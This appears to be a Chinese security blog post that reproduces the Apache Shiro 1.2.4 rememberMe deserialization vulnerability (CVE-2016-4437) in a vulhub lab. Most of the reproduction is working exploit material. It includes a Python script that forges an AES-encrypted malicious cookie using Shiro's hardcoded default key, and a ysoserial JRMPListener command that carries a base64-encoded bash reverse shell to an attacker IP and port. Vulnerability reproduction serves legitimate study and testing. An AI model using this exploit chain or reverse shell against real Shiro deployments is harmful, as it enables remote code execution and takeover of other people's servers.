---
layout:     post
title:      【漏洞复现】Apache Shiro 1.2.4反序列化漏洞复现及分析(cve-2016-4437)
subtitle:   反序列化漏洞
date:       2020-10-16
author:     matrix
header-img: img/websecurity.jpeg
catalog: true
tags:
    - 漏洞复现 
---

## 0x00 漏洞说明
Shiro提供了RememberMe的功能。

Shiro对rememberMe的cookie做了加密处理，当用户登陆成功时，shiro在CookieRememberMeManaer类中将cookie中rememberMe字段内容分别进行 序列化、AES加密、Base64编码操作。
在识别身份的时候，需要对Cookie里的rememberMe字段解密。因此，shiro的解密顺序为：
- 获取rememberMe cookie
- base64 decode
- 解密AES
- 反序列化
由于AES加密的密钥Key以及加密模式被硬编码在代码里，已经可以对AES进行解密，解密和加密完全是对称的。

因此，攻击者构造一个恶意的对象，并且对其序列化，AES加密，base64编码后，作为cookie的rememberMe字段发送。Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞。
## 0x01 漏洞环境
/vulhub/shiro/CVE-2016-4437
## 0x02 漏洞复现

启动docker后访问IP:8080
![-c1791](/img/16027816304805.jpg)


使用bp重放，可看到成功登陆会生成一个rememberme字段
![-c1168](/img/16027816452934.jpg)


下载并生成ysoserial工具
```shell
git clone https://github.com/frohoff/ysoserial.git
cd ysoserial
mvn package -D skipTests
```
![-c826](/img/16027816617110.jpg)


使用以下脚本构造恶意对象
```py
import sys
import uuid
import base64
import subprocess
from Crypto.Cipher import AES
def encode_rememberme(command):
    popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'JRMPClient', command], stdout=subprocess.PIPE)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
    iv = uuid.uuid4().bytes
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext
 
if __name__ == '__main__':
    payload = encode_rememberme(sys.argv[1])   
print "rememberMe={0}".format(payload.decode())
```
![-c980](/img/16027816771014.jpg)

加密反弹shell指令

![-c934](/img/16027816907106.jpg)

通过 ysoserial中的JRMP监听模块，监听 6666 端口并执行反弹shell命令
```shell
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExMS4xLzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}'
```

==payloads/JRMPClient 是结合 exploit/JRMPListener 使用的；
JRMPListener是ysoserial 工具里的其中一个利用模块，作用是通过反序列化，开启当前主机的一个 JRMP Server ，具体的利用过程是，将反序列化数据 发送到 Server 中，然后Server中进行反序列化操作，并开启指定端口，然后在通过JRMPClient去发送攻击 payload；
payloads/JRMPClient 生存的 payload 是发送给目标机器的，exploit/JRMPListener 是在自己服务器上使用的。==

将生成的恶意对象替换原来的cookie信息，重放

![-c1171](/img/16027817043168.jpg)

或使用章神的工具：

![-c928](/img/16027817201111.jpg)

JRMPListener监听到链接

![-c726](/img/16027817416830.jpg)

成功反弹shell

![-c627](/img/16027817523736.jpg)
